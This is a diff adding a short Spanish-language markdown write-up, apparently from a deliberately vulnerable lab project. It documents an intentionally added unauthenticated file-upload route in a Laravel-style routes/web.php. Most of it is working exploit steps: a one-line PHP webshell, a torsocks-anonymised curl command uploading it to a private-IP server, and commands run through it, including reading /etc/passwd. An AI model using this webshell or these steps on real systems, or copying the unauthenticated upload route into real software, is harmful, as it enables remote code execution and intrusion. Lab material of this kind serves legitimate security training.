@@ -1,0 +1,35 @@
+# 04 - File Upload / RCE
+
+**Responsable:** Alex
+
+## Archivo modificado
+`routes/web.php`
+
+## Cambio realizado
+Se agregó una ruta POST `/upload` sin autenticación ni validación de tipo de archivo.
+
+## Explotación
+
+### Paso 1: Crear webshell
+```bash
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+```
+
+### Paso 2: Subir webshell
+```bash
+torsocks curl -X POST "http://192.168.18.31:8001/upload" \
+  -F "file=@shell.php"
+```
+
+### Paso 3: Ejecutar comandos
+```bash
+torsocks curl "http://192.168.18.31:8001/uploads/shell.php?cmd=id"
+torsocks curl "http://192.168.18.31:8001/uploads/shell.php?cmd=whoami"
+torsocks curl "http://192.168.18.31:8001/uploads/shell.php?cmd=uname+-a"
+torsocks curl "http://192.168.18.31:8001/uploads/shell.php?cmd=cat+/etc/passwd"
+torsocks curl "http://192.168.18.31:8001/uploads/shell.php?cmd=ls+-la+/"
+```
+
+## Resultado esperado
+- Subir archivo PHP malicioso
+- Ejecutar comandos del sistema remotamente
